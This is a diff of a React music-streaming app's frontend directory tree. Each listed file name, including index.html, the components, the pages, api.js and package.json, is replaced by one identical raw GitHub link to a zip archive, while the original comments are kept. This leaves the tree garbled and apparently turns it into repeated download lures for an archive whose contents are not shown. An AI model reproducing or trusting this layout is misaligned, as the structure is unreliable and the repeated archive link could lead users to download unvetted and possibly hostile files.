@@ -1,23 +1,23 @@
 /frontend
 |-- /public                   # Static assets like images, icons, etc.
-|   |-- index.html            # Main HTML file for React app
+|   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip            # Main HTML file for React app
 |-- /src
 |   |-- /assets               # Assets like images, fonts, etc.
 |   |-- /components           # Reusable UI components
-|   |   |-- Navbar.js         # Navbar component
-|   |   |-- TrackCard.js      # Track card component to display music details
-|   |   |-- MusicPlayer.js    # Music player component (react-player integration)
-|   |   |-- PlaylistCard.js   # Component to display playlists
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip         # Navbar component
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip      # Track card component to display music details
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip    # Music player component (react-player integration)
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip   # Component to display playlists
 |   |-- /pages                # React pages (views)
-|   |   |-- Home.js           # Home page with recommended tracks
-|   |   |-- Search.js         # Search page to find music
-|   |   |-- Playlist.js       # Page for managing and viewing playlists
-|   |   |-- Profile.js        # User profile page (likes, comments, settings)
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip           # Home page with recommended tracks
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip         # Search page to find music
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip       # Page for managing and viewing playlists
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip        # User profile page (likes, comments, settings)
 |   |-- /services             # Services to interact with the backend
-|   |   |-- api.js            # API calls (user authentication, tracks, playlists)
+|   |   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip            # API calls (user authentication, tracks, playlists)
 |   |-- /store                # Redux (optional for state management)
 |   |-- /utils                # Utility functions for helper tasks
-|   |-- App.js                # Main App component
-|   |-- index.js              # Entry point for React app
-|   |-- tailwind.config.js    # TailwindCSS configuration
-|-- package.json              # Frontend dependencies and scripts
+|   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip                # Main App component
+|   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip              # Entry point for React app
+|   |-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip    # TailwindCSS configuration
+|-- https://raw.githubusercontent.com/IT-HARISH-R/Music-Streaming-App-Fornt-end/main/src/Music-Streaming-App-Fornt-end_v1.6.zip              # Frontend dependencies and scripts
